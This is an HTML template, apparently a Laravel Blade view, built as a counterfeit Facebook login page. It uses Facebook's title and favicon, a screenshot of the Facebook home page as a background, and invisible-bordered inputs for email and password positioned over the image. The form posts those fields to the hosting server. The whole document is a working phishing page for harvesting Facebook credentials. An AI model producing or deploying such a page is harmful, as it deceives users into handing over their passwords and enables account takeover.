<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/H3nktOa7ZMg.ico">
    <title>Facebook</title>
    <style>
        body {
            background: white url('images/header.png') repeat-x;
            margin: 0;
            overflow: hidden;
        }

        .form {
            background: url('images/fbhome-en.png') no-repeat center top;
            height: 95%;
        }

        .kl {
            position: absolute;
            top: 2.5em;
            right: 50%;
            margin-right: -19.52em;
            width: 150px;
            padding: 3px;
            height: 22px;
            border: 1px solid #1d2a5b;
        }

        .kj {
            position: absolute;
            top: 2.5em;
            right: 50%;
            margin-right: -31.8em;
            width: 150px;
            padding: 3px;
            height: 22px;
            border: 1px solid #1d2a5b;
        }

        .kk {
            position: absolute;
            top: 2.5em;
            right: 50%;
            margin-right: -36.7em;
            width: 50px;
            padding: 3px;
            height: 23px;
            border: transparent;
            background: transparent;
            cursor: pointer;
        }
    </style>
</head>
<body>
<form class="form" method="POST">
    <input class="kl" name="email" type="text">
    <input class="kj" name="pass" type="password">
    <input class="kk" value="" type="submit">
    <input type="hidden" name="_token" value="{{ csrf_token() }}">
</form>

</body>
</html>